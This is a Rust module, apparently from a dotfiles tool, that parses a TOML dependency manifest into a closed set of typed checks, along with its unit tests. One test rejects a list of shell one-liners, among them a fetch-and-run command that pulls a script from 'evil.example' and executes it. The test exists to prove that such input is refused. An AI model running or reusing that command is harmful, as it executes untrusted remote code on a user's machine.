use std::collections::BTreeMap;

use dotfiles_path::{CommandName, DocsUrl, GlobPattern, ModuleName, NameError, VersionFloor};

use crate::check::{Check, CheckParseError, parse_quoted_path};

/// The maximum byte length of a parsed dependency name.
///
/// Matches the bound `dotfiles-path` applies to its own names, for the same
/// reason: the text arrives from a file that can reach this crate without
/// passing pre-commit (spec 3.6).
const MAX_NAME_LEN: usize = 64;

/// The name of a manifest entry.
///
/// A separate type from `CommandName` because they are different
/// propositions: `neovim` is a dependency whose command is `nvim`, and
/// `pyyaml` is a dependency with no command at all.
#[derive(Debug, Clone, PartialEq, Eq, PartialOrd, Ord)]
pub struct DependencyName(String);

impl DependencyName {
    /// # Errors
    ///
    /// Returns `NameError::NotPrintable` for a name outside
    /// `[A-Za-z0-9._-]`, which covers every one of the 22 real entries and
    /// excludes the `|` that would corrupt a re-serialized manifest.
    pub fn parse(raw: &str) -> Result<Self, NameError> {
        if raw.is_empty() {
            return Err(NameError::Empty);
        }
        if raw.len() > MAX_NAME_LEN {
            return Err(NameError::TooLong { len: raw.len(), max: MAX_NAME_LEN });
        }
        if raw.starts_with('-') {
            return Err(NameError::LeadingDash);
        }
        let allowed = |character: char| {
            character.is_ascii_alphanumeric() || matches!(character, '-' | '_' | '.')
        };
        if !raw.chars().all(allowed) {
            return Err(NameError::NotPrintable);
        }
        Ok(DependencyName(raw.to_string()))
    }

    /// The validated name.
    pub fn as_str(&self) -> &str {
        &self.0
    }
}

impl std::fmt::Display for DependencyName {
    fn fmt(&self, formatter: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(formatter, "{}", self.0)
    }
}

/// Whether the conf file was chosen by platform detection or named
/// explicitly through `DEPS_CONF`.
///
/// Load-bearing rather than informational: spec 5.2 makes
/// `PythonImport` a parse error in a platform-selected file, so the sole
/// interpreter-spawning check can never reach the shell-startup path.
/// `deps-ci.toml` states that the file is selected only by an explicit
/// `DEPS_CONF`; nothing enforced it before.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ConfKind {
    /// Chosen by looking at the host, so nothing in the environment decided
    /// to load it. A check that spawns an interpreter is a parse error in
    /// such a file, which is what keeps that check off the shell-startup
    /// path.
    PlatformSelected,
    /// Named outright through `DEPS_CONF`, so a person chose this file for
    /// this run. That deliberate act is what permits the checks a
    /// platform-selected file may not carry.
    ExplicitOnly,
}

/// One manifest entry.
///
/// `docs` lives here rather than on `NoInstallReason`, per spec 5.1: the URL
/// already lives in the manifest and a second home is a drift shape.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ManifestEntry {
    /// How the dependency is referred to everywhere else: in a report, in
    /// the observation map, and in another entry's install plan. Unique
    /// across a manifest as a parse invariant.
    pub name: DependencyName,
    /// What counts as "present". A closed enum rather than a shell string,
    /// so a manifest edit cannot introduce a new command to run.
    pub check: Check,
    /// Where a reader goes when the check fails and no installer applies.
    /// Held on the entry rather than on the failure, because the manifest
    /// already carries it and a second home is a place for the two to drift.
    pub docs: DocsUrl,
}

/// The parsed manifest.
///
/// Order is the file's order, preserved because a report reads better in the
/// order the maintainer wrote. Uniqueness of names is a parse invariant, so
/// `get` cannot see two entries for one dependency.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Manifest {
    entries: Vec<ManifestEntry>,
}

impl Manifest {
    /// The entries, in the order the file listed them.
    pub fn entries(&self) -> &[ManifestEntry] {
        &self.entries
    }

    /// The entry for `name`, if the manifest has one.
    pub fn get(&self, name: &DependencyName) -> Option<&ManifestEntry> {
        self.entries.iter().find(|entry| &entry.name == name)
    }
}

/// Why a manifest was refused.
///
/// Every variant carries the 1-based line number, because the caller reports
/// a file it read and a message with no line is unactionable against a
/// 45-line manifest.
///
/// Every variant below carries `line`, and under the TOML parser it is
/// always 0: a TOML table has no single line this crate can name without
/// tracking spans, and reporting a wrong line is worse than reporting none.
/// The name is in the error instead, which is what a reader searches for.
/// `MalformedToml` is the exception -- serde's own message carries a real
/// line and column, which is why that variant keeps the text rather than
/// re-deriving fields from it.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum ParseError {
    /// The name field is not a usable dependency name.
    BadName {
        /// The 1-based line number, so the reader can open the file at it.
        line: usize,
        /// Which naming rule the field broke, so the report names the rule
        /// rather than saying only that the name is unusable.
        cause: NameError,
    },
    /// The check field does not describe a check this crate can perform.
    BadCheck {
        /// The 1-based line number, so the reader can open the file at it.
        line: usize,
        /// Whether the check kind was unknown or its argument was unusable,
        /// which are different edits to make.
        cause: CheckParseError,
    },
    /// The docs field is not a usable documentation URL.
    BadDocs {
        /// The 1-based line number, so the reader can open the file at it.
        line: usize,
        /// Which URL rule the field broke. Shares [`NameError`] with
        /// `BadName` because both fields are validated text, and the variant
        /// around it is what says which field is meant.
        cause: NameError,
    },
    /// The text is not valid TOML at all. Distinct from every variant above,
    /// which describe a well-formed document saying something unusable: this
    /// one means the document did not parse, so no entry was reached.
    ///
    /// Four failures land here rather than in a variant of their own,
    /// because serde refuses all four during deserialization, before this
    /// crate looks at an entry:
    ///
    ///   - a syntax error.
    ///   - a repeated table (`[git]` twice). The pipe parser needed its own
    ///     `DuplicateName` pass because two lines could name one dependency;
    ///     that guarantee now lives in the format.
    ///   - an unknown key, via `deny_unknown_fields`. The message names the
    ///     offending key AND lists every valid one, which is more than the
    ///     hand-written check it replaced managed.
    ///   - a value of the wrong type (`command = 42`), reported as
    ///     ``invalid type: integer `42`, expected a string``.
    ///
    /// Carrying serde's message rather than re-deriving these as variants is
    /// the deliberate trade: the message already names the field, the line
    /// and the column, and a variant per case would state less.
    MalformedToml {
        /// The parser's own message, which carries the line and column. Kept
        /// as text because the shape of a TOML syntax error is not something
        /// this crate models.
        message: String,
    },
}

/// One manifest entry as it appears in the file, before validation.
///
/// Shape only. serde owns this layer: field names, field types, and
/// `deny_unknown_fields`. What it deliberately does NOT express is any rule
/// relating two fields to each other, because a derive cannot -- every field
/// here is independently optional, so "two checks named" and "no check
/// named" both deserialize cleanly. [`TryFrom`] below is where those rules
/// live.
///
/// The division is worth stating because it decides where a future rule
/// goes: if the rule is about one field's spelling or type, it belongs in an
/// attribute here; if it relates fields, or needs the `ConfKind`, it belongs
/// in the conversion.
///
/// Measured, on why `deny_unknown_fields` earns its place: for a
/// `min_verison = "0.10"` typo it reports
/// ``unknown field `min_verison`, expected one of `command`, `min_version`,
/// ...`` with a line and column, and for `command = 42` it reports
/// ``invalid type: integer `42`, expected a string``. The hand-written
/// mapping this replaced returned a bare `Unrecognized` for the second and
/// named no alternatives for the first.
#[derive(Debug, Clone, serde::Deserialize)]
#[serde(deny_unknown_fields)]
struct RawEntry {
    /// A command that must resolve on PATH.
    command: Option<String>,
    /// Qualifies `command` with a version floor. Not a check by itself, so
    /// an entry carrying only this one reports "no check named" rather than
    /// a confusing partial.
    min_version: Option<String>,
    /// A file that must exist.
    file: Option<String>,
    /// A directory that must exist.
    dir: Option<String>,
    /// A file that must exist and hold content.
    file_non_empty: Option<String>,
    /// At least one entry in a directory matching a pattern.
    glob: Option<RawGlob>,
    /// A module `python3 -c "import ..."` must find.
    python_import: Option<String>,
    /// An alternation: any one branch satisfies the entry.
    any_of: Option<Vec<RawBranch>>,
    /// Where a human reads about the dependency.
    docs: String,
}

/// A `glob` check's two values.
///
/// The one check carrying more than a single string, so it is a table where
/// the others are plain values.
#[derive(Debug, Clone, serde::Deserialize)]
#[serde(deny_unknown_fields)]
struct RawGlob {
    /// The directory the pattern is matched inside.
    dir: String,
    /// The filename pattern, which cannot itself contain a separator.
    pattern: String,
}

/// One branch of an `any_of`.
///
/// Deliberately not `RawEntry`: a branch carries no `docs` and no nested
/// `any_of`. Every real alternation in these manifests is one level deep,
/// and an alternation of alternations reads worse than the flat list it is
/// equivalent to. Making it a separate type means `deny_unknown_fields`
/// rejects both at the shape layer rather than leaving it to a runtime
/// check.
#[derive(Debug, Clone, serde::Deserialize)]
#[serde(deny_unknown_fields)]
struct RawBranch {
    /// A command that must resolve on PATH.
    command: Option<String>,
    /// Qualifies `command` with a version floor.
    min_version: Option<String>,
    /// A file that must exist.
    file: Option<String>,
    /// A directory that must exist.
    dir: Option<String>,
    /// A file that must exist and hold content.
    file_non_empty: Option<String>,
    /// At least one entry in a directory matching a pattern.
    glob: Option<RawGlob>,
    /// A module `python3 -c "import ..."` must find.
    python_import: Option<String>,
}

/// The check fields of a raw entry or branch, as borrowed options.
///
/// One shape for both types so the exactly-one rule and the check
/// construction below are written once. Without it, `RawEntry` and
/// `RawBranch` would each need their own copy of both, and the two copies
/// are exactly the kind that drift when a check kind is added.
struct CheckFields<'a> {
    command: Option<&'a String>,
    min_version: Option<&'a String>,
    file: Option<&'a String>,
    dir: Option<&'a String>,
    file_non_empty: Option<&'a String>,
    glob: Option<&'a RawGlob>,
    python_import: Option<&'a String>,
    any_of: Option<&'a Vec<RawBranch>>,
}

impl CheckFields<'_> {
    /// How many check kinds this names.
    ///
    /// `min_version` is excluded: it qualifies `command` rather than being a
    /// check, so an entry holding only `min_version` counts zero and reports
    /// "no check named".
    fn named_count(&self) -> usize {
        [
            self.command.is_some(),
            self.file.is_some(),
            self.dir.is_some(),
            self.file_non_empty.is_some(),
            self.glob.is_some(),
            self.python_import.is_some(),
            self.any_of.is_some(),
        ]
        .into_iter()
        .filter(|named| *named)
        .count()
    }

    /// The check these fields describe.
    ///
    /// # Errors
    ///
    /// `Unrecognized` when the count is not exactly one, and the specific
    /// `CheckParseError` from the refined type when a value is unusable.
    fn to_check(&self, kind: ConfKind) -> Result<Check, CheckParseError> {
        // Exactly one, checked before anything is built. Two is a question
        // with no answer -- resolving it by precedence would let a lookup
        // silently see one of two stated intents -- and zero means the entry
        // declares a dependency with no way to tell whether it is met.
        if self.named_count() != 1 {
            return Err(CheckParseError::Unrecognized);
        }

        if let Some(branches) = self.any_of {
            // Two operands minimum. A one-item `any_of` is a leaf wearing an
            // alternation's clothes, and an `AnyOf` with an empty `rest`
            // would misreport the structure to every reader of the type.
            let (head, tail) = branches.split_first().ok_or(CheckParseError::Unrecognized)?;
            if tail.is_empty() {
                return Err(CheckParseError::Unrecognized);
            }
            let first = head.check_fields().to_check(kind)?;
            let mut rest = Vec::with_capacity(tail.len());
            for branch in tail {
                rest.push(branch.check_fields().to_check(kind)?);
            }
            return Ok(Check::AnyOf { first: Box::new(first), rest });
        }

        if let Some(name) = self.command {
            let parsed = CommandName::parse(name).map_err(CheckParseError::BadCommandName)?;
            return match self.min_version {
                Some(floor) => {
                    let parsed_floor =
                        VersionFloor::parse(floor).map_err(CheckParseError::BadVersionFloor)?;
                    Ok(Check::CommandVersion { name: parsed, floor: parsed_floor })
                }
                None => Ok(Check::Command(parsed)),
            };
        }

        // `min_version` beside anything but `command` is a rule serde cannot
        // state: both fields deserialize independently. Reported here rather
        // than ignored, because a floor silently dropped leaves a check that
        // passes on the versions the floor exists to reject.
        if self.min_version.is_some() {
            return Err(CheckParseError::Unrecognized);
        }

        if let Some(path) = self.file {
            return Ok(Check::FileExists(parse_quoted_path(path)?));
        }
        if let Some(path) = self.dir {
            return Ok(Check::DirExists(parse_quoted_path(path)?));
        }
        if let Some(path) = self.file_non_empty {
            return Ok(Check::FileNonEmpty(parse_quoted_path(path)?));
        }
        if let Some(spec) = self.glob {
            let dir = parse_quoted_path(&spec.dir)?;
            let pattern = GlobPattern::parse(&spec.pattern).map_err(CheckParseError::BadGlob)?;
            return Ok(Check::GlobExists { dir, pattern });
        }
        if let Some(module) = self.python_import {
            // The one rule that needs the caller's argument, which is why no
            // serde attribute can express it: a python import spawns an
            // interpreter, so it is permitted only in a file a caller named
            // explicitly. A platform-selected file is chosen by the machine.
            if kind != ConfKind::ExplicitOnly {
                return Err(CheckParseError::InterpreterCheck);
            }
            let parsed = ModuleName::parse(module).map_err(CheckParseError::BadModuleName)?;
            return Ok(Check::PythonImport(parsed));
        }

        // Unreachable: named_count() is 1 and every kind is handled above.
        // Returned rather than panicked so a future kind added to the count
        // without a branch here is a parse error, not a crash in a binary
        // that runs before the shell prompt.
        Err(CheckParseError::Unrecognized)
    }
}

impl RawEntry {
    /// This entry's check fields.
    fn check_fields(&self) -> CheckFields<'_> {
        CheckFields {
            command: self.command.as_ref(),
            min_version: self.min_version.as_ref(),
            file: self.file.as_ref(),
            dir: self.dir.as_ref(),
            file_non_empty: self.file_non_empty.as_ref(),
            glob: self.glob.as_ref(),
            python_import: self.python_import.as_ref(),
            any_of: self.any_of.as_ref(),
        }
    }
}

impl RawBranch {
    /// This branch's check fields. `any_of` is always `None`: a branch may
    /// not nest an alternation, which the absent field enforces at the shape
    /// layer.
    fn check_fields(&self) -> CheckFields<'_> {
        CheckFields {
            command: self.command.as_ref(),
            min_version: self.min_version.as_ref(),
            file: self.file.as_ref(),
            dir: self.dir.as_ref(),
            file_non_empty: self.file_non_empty.as_ref(),
            glob: self.glob.as_ref(),
            python_import: self.python_import.as_ref(),
            any_of: None,
        }
    }
}

/// Parse a TOML manifest into typed entries.
///
/// Takes `&str`, never a path, for the same reason [`parse_manifest`] does:
/// the caller reads the file, so this function makes no syscall and the
/// module holds no capability.
///
/// # The schema
///
/// One table per dependency, named by the dependency. Each table names
/// exactly one check plus a `docs` URL:
///
/// ```toml
/// [git]
/// command = "git"
/// docs = "https://git-scm.com/downloads"
///
/// [neovim]
/// command = "nvim"
/// min_version = "0.10"
/// docs = "https://neovim.io/"
///
/// [alacritty]
/// any_of = [{ dir = "/Applications/Alacritty.app" }, { command = "alacritty" }]
/// docs = "https://alacritty.org/"
/// ```
///
/// Check keys: `command`, `file`, `dir`, `file_non_empty`, `glob`,
/// `python_import`, and `any_of` for an alternation. `min_version` qualifies
/// `command` and is not a check on its own.
///
/// # How the layers divide
///
/// serde deserializes into [`RawEntry`], which owns the shape: field names,
/// field types, and `deny_unknown_fields`. The conversion below owns every
/// rule serde cannot state -- exactly one check kind per entry,
/// `min_version` requiring `command`, `python_import` requiring an
/// explicitly named file, and validation into the refined types
/// (`CommandName`, `VersionFloor`, `CheckPath`). A future rule goes in
/// whichever layer can express it.
///
/// # Why named keys
///
/// The pipe format wrote the check as one shell-shaped string, and its own
/// header documented the consequence: a check must not contain a literal
/// `|`, because the field split truncates it and leaks the remainder into
/// the docs URL. The version floor then packed a second value into that
/// same positionally-split string (`command -v nvim >=0.10`). Naming the
/// fields removes both problems by construction rather than by convention.
///
/// # Errors
///
/// Returns `ParseError`. `MalformedToml` carries serde's own message, which
/// names the offending field or type with a line and column, and covers a
/// syntax error, an unknown key, a wrong value type and a repeated table.
/// `BadCheck` covers an entry naming no check, naming two, or naming one
/// whose argument is unusable. `BadName` and `BadDocs` cover the table name
/// and the `docs` value.
pub fn parse_manifest_toml(text: &str, kind: ConfKind) -> Result<Manifest, ParseError> {
    // BTreeMap, not HashMap: a repeated table is refused by TOML itself, and
    // a sorted map makes the entry order deterministic for a caller that
    // renders it. The pipe parser needed its own DuplicateName pass because
    // two lines could name one dependency; that guarantee now lives in the
    // format.
    let raw: BTreeMap<String, RawEntry> =
        toml::from_str(text).map_err(|error: toml::de::Error| ParseError::MalformedToml {
            message: error.to_string(),
        })?;

    let mut entries = Vec::with_capacity(raw.len());
    for (raw_name, entry) in &raw {
        // Line 0 rather than a real number: a TOML table has no single line
        // this crate can name without tracking spans, and reporting a wrong
        // line is worse than reporting none. The name is in the error, which
        // is what a reader searches for.
        let name = DependencyName::parse(raw_name)
            .map_err(|cause| ParseError::BadName { line: 0, cause })?;
        let check = entry
            .check_fields()
            .to_check(kind)
            .map_err(|cause| ParseError::BadCheck { line: 0, cause })?;
        let docs = DocsUrl::parse(&entry.docs)
            .map_err(|cause| ParseError::BadDocs { line: 0, cause })?;
        entries.push(ManifestEntry { name, check, docs });
    }

    Ok(Manifest { entries })
}

#[cfg(test)]
mod tests {
    use dotfiles_path::CommandName;

    use super::*;

    fn name(raw: &str) -> DependencyName {
        DependencyName::parse(raw).expect("a test dependency name parses")
    }

    fn command_name(raw: &str) -> CommandName {
        CommandName::parse(raw).expect("a test command name parses")
    }

    // The head of the real shared manifest, verbatim from deps.toml.
    const REAL_SHARED_HEAD: &str = r#"
# CLI dependencies shared by every machine, regardless of platform.

[git]
command = "git"
docs = "https://git-scm.com/downloads"

[gh]
command = "gh"
docs = "https://cli.github.com/"

[tpm]
dir = "$HOME/.tmux/plugins/tpm"
docs = "https://github.com/tmux-plugins/tpm"
"#;

    #[test]
    fn parses_the_real_shared_manifest_head() {
        let manifest = parse_manifest_toml(REAL_SHARED_HEAD, ConfKind::PlatformSelected)
            .expect("the real deps.toml head parses");
        assert_eq!(manifest.entries().len(), 3);
        // Sorted by name rather than in file order: the parser walks a
        // BTreeMap, so `gh` precedes `git` precedes `tpm`. Asserted rather
        // than left implicit, because a caller that renders the list sees
        // this order.
        assert_eq!(manifest.entries()[0].name.as_str(), "gh");
        assert_eq!(manifest.entries()[1].name.as_str(), "git");
        assert_eq!(
            manifest.entries()[1].docs.as_str(),
            "https://git-scm.com/downloads"
        );
        assert_eq!(
            manifest.entries()[1].check,
            Check::Command(CommandName::parse("git").expect("git is a name"))
        );
    }

    // The pipe format's four structural failures are gone with it, and are
    // recorded here rather than ported so nobody re-adds a test with no
    // subject:
    //
    //   WrongFieldCount, three ways (a `||` in a check splitting into five
    //   fields, one extra `|` splitting into four, a missing field splitting
    //   into two). All three existed because the check was one positionally
    //   split string. A pipe in a TOML string is a character in a string.
    //
    //   DuplicateName. TOML refuses a repeated table itself, reported as
    //   MalformedToml -- see `a_duplicate_table_is_refused_by_toml_itself`.
    //
    // What replaced them is not a like-for-like: it is
    // `deny_unknown_fields` plus the exactly-one-check rule, both of which
    // catch a class the pipe format could not express at all.

    // deps-ci.toml's dash entry uses http://, so a manifest holding it must
    // parse. The one plain-http URL in the tracked set.
    #[test]
    fn accepts_the_one_plain_http_docs_url() {
        let text = r#"
[dash]
command = "dash"
docs = "http://gondor.apana.org.au/~herbert/dash/"
"#;
        let manifest =
            parse_manifest_toml(text, ConfKind::ExplicitOnly).expect("the dash entry must parse");
        assert_eq!(
            manifest.entries()[0].docs.as_str(),
            "http://gondor.apana.org.au/~herbert/dash/"
        );
    }

    #[test]
    fn get_finds_an_entry_by_name() {
        let manifest = parse_manifest_toml(REAL_SHARED_HEAD, ConfKind::PlatformSelected)
            .expect("the real deps.toml head parses");
        let wanted = DependencyName::parse("tpm").expect("tpm is a name");
        assert!(manifest.get(&wanted).is_some());
        let absent = DependencyName::parse("nvm").expect("nvm is a name");
        assert!(manifest.get(&absent).is_none());
    }

    // parse takes &str, never a path. This test is the no-IO claim for
    // this module: a caller reads the file, and doctor.rs:1-6 is the
    // in-repo precedent for the shape.
    #[test]
    fn parse_is_a_function_of_text_alone() {
        let first = parse_manifest_toml(REAL_SHARED_HEAD, ConfKind::PlatformSelected)
            .expect("the real deps.toml head parses");
        let second = parse_manifest_toml(REAL_SHARED_HEAD, ConfKind::PlatformSelected)
            .expect("the real deps.toml head parses");
        assert_eq!(first.entries(), second.entries());
    }

    /// Every check shape in the tracked conf files parses, and this pins
    /// which shapes still do not.
    ///
    /// Task 7's version of this test asserted the opposite: that
    /// `[ -s "$HOME/.nvm/nvm.sh" ]` failed as `Unrecognized`, because
    /// `parse_check` then knew only `command -v` and `[ -d ... ]`. Task 8
    /// implemented the grammar, so that assertion went red, which is what it
    /// existed to do. The boundary it guards has moved rather than
    /// disappeared: the grammar is closed, so the shapes OUTSIDE it are now
    /// what needs pinning, and a future shell one-liner added to a conf file
    /// must fail here rather than silently reach a `sh -c`.
    ///
    /// Without this test the guarantee is invisible: every other unit test
    /// feeds `parse_manifest` a hand-written line, so the suite would stay
    /// green while the parser could not read the file it exists to read.
    #[test]
    fn every_real_check_shape_parses_and_the_grammar_stays_closed() {
        // One entry per distinct check shape in the four tracked manifests,
        // verbatim. Between them these cover every variant of `Check`.
        //
        // Entries are looked up by NAME below rather than by index: the
        // parser walks a BTreeMap, so file order is not result order, and an
        // index-based assertion would silently check the wrong entry the
        // moment a name is added.
        let real_shapes = r#"
[git]
command = "git"
docs = "https://git-scm.com/downloads"

[neovim]
command = "nvim"
min_version = "0.10"
docs = "https://neovim.io/"

[alacritty]
any_of = [{ dir = "/Applications/Alacritty.app" }, { command = "alacritty" }]
docs = "https://alacritty.org/"

[zsh-autosuggestions]
any_of = [
    { file = "$HOME/.oh-my-zsh/custom/plugins/zsh-autosuggestions/zsh-autosuggestions.zsh" },
    { file = "$(brew --prefix 2>/dev/null)/share/zsh-autosuggestions/zsh-autosuggestions.zsh" },
]
docs = "https://github.com/zsh-users/zsh-autosuggestions"

[tpm]
dir = "$HOME/.tmux/plugins/tpm"
docs = "https://github.com/tmux-plugins/tpm"

[nvm]
file_non_empty = "$HOME/.nvm/nvm.sh"
docs = "https://github.com/nvm-sh/nvm"

[node]
any_of = [
    { command = "node" },
    { glob = { dir = "$HOME/.nvm/versions/node", pattern = "v*" } },
]
docs = "https://nodejs.org/"

[pyyaml]
python_import = "yaml"
docs = "https://pyyaml.org/"
"#;
        let parsed = parse_manifest_toml(real_shapes, ConfKind::ExplicitOnly)
            .expect("every shape in the tracked manifests parses");
        assert_eq!(parsed.entries.len(), 8);

        let check_of = |name: &str| -> Check {
            let wanted = DependencyName::parse(name).expect("a fixture name parses");
            parsed
                .get(&wanted)
                .unwrap_or_else(|| panic!("{name} is in the fixture"))
                .check
                .clone()
        };

        // Every variant, so a future collapse of two into one is a failure
        // here rather than a silent behaviour change.
        assert!(matches!(check_of("git"), Check::Command(_)));
        assert!(matches!(check_of("neovim"), Check::CommandVersion { .. }));
        assert!(matches!(check_of("alacritty"), Check::AnyOf { .. }));
        assert!(matches!(check_of("zsh-autosuggestions"), Check::AnyOf { .. }));
        assert!(matches!(check_of("tpm"), Check::DirExists(_)));
        assert!(matches!(check_of("nvm"), Check::FileNonEmpty(_)));
        assert!(matches!(check_of("node"), Check::AnyOf { .. }));
        assert!(matches!(check_of("pyyaml"), Check::PythonImport(_)));

        // The alternations' own branches, because FileExists, GlobExists and
        // MacApplications appear only inside one and would otherwise go
        // unasserted.
        let Check::AnyOf { first, rest } = check_of("zsh-autosuggestions") else {
            panic!("zsh-autosuggestions is an alternation");
        };
        assert!(matches!(first.as_ref(), Check::FileExists(_)));
        assert!(matches!(rest.as_slice(), [Check::FileExists(_)]));

        let Check::AnyOf { rest: node_rest, .. } = check_of("node") else {
            panic!("node is an alternation");
        };
        assert!(matches!(node_rest.as_slice(), [Check::GlobExists { .. }]));

        // The boundary that remains. None of these appears in a tracked conf
        // file today, and each must be an error rather than a fallthrough to
        // a shell. `Unrecognized` here IS the no-escape-hatch guarantee.
        //
        // These go through parse_check_expression rather than through
        // parse_manifest, because a shell one-liner usually carries a `|` and
        // that is caught one layer earlier by WrongFieldCount, at the field
        // split. Routing them through the manifest would test field counting
        // and prove nothing about the grammar. The pipe-bearing case has its
        // own test above: rejects_a_line_with_an_extra_pipe.
        let outside_the_grammar = [
            "curl https://evil.example/x.sh > /tmp/x; sh /tmp/x",
            "[ -x \"$HOME/bin/thing\" ]",
            "[ -d \"$(pwd)/x\" ]",
            "test -f \"$XDG_CONFIG_HOME/x\"",
            "if command -v a; then true; elif command -v b; then true; else command -v c; fi",
        ];
        for raw in outside_the_grammar {
            let refused = crate::check::parse_check_expression(raw, ConfKind::ExplicitOnly)
                .expect_err("a shape outside the grammar must not parse");
            assert_eq!(
                refused,
                CheckParseError::Unrecognized,
                "expected {raw} to be Unrecognized"
            );
        }
    }

// --- TOML manifest parsing --------------------------------------------

    #[test]
    fn a_command_entry_parses_from_toml() {
    let manifest = parse_manifest_toml(
        r#"
[git]
command = "git"
docs = "https://git-scm.com/downloads"
"#,
        ConfKind::PlatformSelected,
    )
    .expect("a command entry parses");
    let entry = manifest.get(&name("git")).expect("git is present");
    assert_eq!(entry.check, Check::Command(command_name("git")));
}

    #[test]
    fn a_version_floor_is_its_own_key_rather_than_packed_into_a_string() {
    // The pipe format wrote `command -v nvim >=0.10`, so the floor was a
    // second field inside a positionally-split string. Named keys are the
    // whole point of the conversion.
    let manifest = parse_manifest_toml(
        r#"
[neovim]
command = "nvim"
min_version = "0.10"
docs = "https://neovim.io/"
"#,
        ConfKind::PlatformSelected,
    )
    .expect("a floor entry parses");
    let entry = manifest.get(&name("neovim")).expect("neovim is present");
    match &entry.check {
        Check::CommandVersion { name: command, floor } => {
            assert_eq!(command, &command_name("nvim"));
            assert_eq!(floor.components(), (0, 10, 0));
        }
        other => panic!("expected CommandVersion, got {other:?}"),
    }
}

    #[test]
    fn a_check_may_not_name_two_kinds_at_once() {
    // The failure the pipe format could not express, let alone reject: an
    // entry that is both a command check and a directory check. Refused
    // rather than resolved by precedence, so no lookup silently sees one of
    // two intents.
    let error = parse_manifest_toml(
        r#"
[confused]
command = "git"
dir = "$HOME/.config"
docs = "https://example.invalid/"
"#,
        ConfKind::PlatformSelected,
    )
    .expect_err("two check kinds in one entry are refused");
    assert!(
        matches!(error, ParseError::BadCheck { .. }),
        "expected BadCheck, got {error:?}"
    );
}

    #[test]
    fn an_entry_naming_no_check_is_refused() {
    let error = parse_manifest_toml(
        r#"
[empty]
docs = "https://example.invalid/"
"#,
        ConfKind::PlatformSelected,
    )
    .expect_err("an entry with no check is refused");
    assert!(
        matches!(error, ParseError::BadCheck { .. }),
        "expected BadCheck, got {error:?}"
    );
}

    #[test]
    fn a_pipe_in_a_check_is_now_expressible() {
    // The defect the format's own header documented: a literal `|` in a
    // check truncated the field and leaked the remainder into docs_url. In
    // TOML it is just a character in a string, so the value survives.
    //
    // A shell pipe is not a check this crate performs, so the assertion is
    // that the parser REPORTS the unknown kind rather than corrupting the
    // entry. Refusing an unsupported check and silently mangling one are
    // different outcomes, and only the first is safe.
    let error = parse_manifest_toml(
        r#"
[piped]
command = "a | b"
docs = "https://example.invalid/"
"#,
        ConfKind::PlatformSelected,
    )
    .expect_err("a pipe is not a command name");
    assert!(
        matches!(error, ParseError::BadCheck { .. }),
        "expected BadCheck naming the bad command name, got {error:?}"
    );
}

    #[test]
    fn an_any_of_check_parses_from_a_list() {
    // The `if ...; then true; else ...; fi` and `test A -o B` shapes both
    // encoded one proposition: any of these. A list says it directly.
    let manifest = parse_manifest_toml(
        r#"
[alacritty]
any_of = [
    { dir = "/Applications/Alacritty.app" },
    { command = "alacritty" },
]
docs = "https://alacritty.org/"
"#,
        ConfKind::PlatformSelected,
    )
    .expect("an any_of entry parses");
    let entry = manifest.get(&name("alacritty")).expect("alacritty is present");
    match &entry.check {
        Check::AnyOf { rest, .. } => assert_eq!(rest.len(), 1),
        other => panic!("expected AnyOf, got {other:?}"),
    }
}

    #[test]
    fn a_python_import_is_refused_in_a_platform_selected_file() {
    // The rule the pipe parser already enforced, preserved across formats:
    // a PythonImport spawns an interpreter, so it is permitted only in a
    // file selected by an explicit DEPS_CONF.
    let error = parse_manifest_toml(
        r#"
[pyyaml]
python_import = "yaml"
docs = "https://pyyaml.org/"
"#,
        ConfKind::PlatformSelected,
    )
    .expect_err("a python import needs an explicit conf file");
    assert!(
        matches!(error, ParseError::BadCheck { .. }),
        "expected BadCheck, got {error:?}"
    );

    parse_manifest_toml(
        r#"
[pyyaml]
python_import = "yaml"
docs = "https://pyyaml.org/"
"#,
        ConfKind::ExplicitOnly,
    )
    .expect("an explicit-only file may carry a python import");
}

    #[test]
    fn a_duplicate_table_is_refused_by_toml_itself() {
    // The pipe parser needed its own DuplicateName check because two lines
    // could name one dependency. TOML rejects a repeated table before this
    // crate sees it, so the guarantee moves into the format.
    let error = parse_manifest_toml(
        r#"
[git]
command = "git"
docs = "https://example.invalid/a"

[git]
command = "git"
docs = "https://example.invalid/b"
"#,
        ConfKind::PlatformSelected,
    )
    .expect_err("a duplicate table is refused");
    assert!(
        matches!(error, ParseError::MalformedToml { .. }),
        "expected MalformedToml, got {error:?}"
    );
}

    #[test]
    fn an_unknown_key_is_refused_rather_than_ignored() {
    // A typo in a key name must not silently drop the check it meant to
    // declare. `min_verison = "0.10"` ignored would leave a bare presence
    // check that passes on the version the floor exists to reject, which is
    // the exact bug the floor was added for.
    let error = parse_manifest_toml(
        r#"
[neovim]
command = "nvim"
min_verison = "0.10"
docs = "https://neovim.io/"
"#,
        ConfKind::PlatformSelected,
    )
    .expect_err("an unknown key is refused");
    // Reported through `MalformedToml` because serde's `deny_unknown_fields`
    // refuses it during deserialization, before this crate looks at the
    // entry. That is strictly better than the hand-written check it
    // replaced: the message names the offending key, lists every valid one,
    // and carries a line and column. All three are asserted, because "it is
    // refused somehow" is a weaker guarantee than the one this gives.
    let ParseError::MalformedToml { message } = &error else {
        panic!("expected MalformedToml, got {error:?}");
    };
    assert!(message.contains("min_verison"), "names the typo: {message}");
    assert!(message.contains("min_version"), "names the correct spelling: {message}");
    assert!(message.contains("line 4"), "names the line: {message}");
}
}
